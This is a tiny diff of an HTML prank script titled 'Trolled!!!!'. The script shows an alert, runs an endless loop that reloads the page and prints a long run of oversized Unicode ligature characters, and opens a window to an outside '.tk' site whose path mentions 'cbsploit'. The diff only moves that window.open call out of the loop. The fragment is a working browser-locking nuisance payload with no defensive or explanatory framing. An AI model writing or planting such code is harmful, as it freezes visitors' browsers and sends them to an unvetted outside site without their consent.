@@ -3,7 +3,7 @@ Trolled!!!!
 alert("rip")
 while(true){
 location.reload(1) 
-window.open("https://wockerland.tk/cbsploit/");
 print("﷽﷽﷽﷽﷽ so on") 
 }
+window.open("https://wockerland.tk/cbsploit/");
 </script>
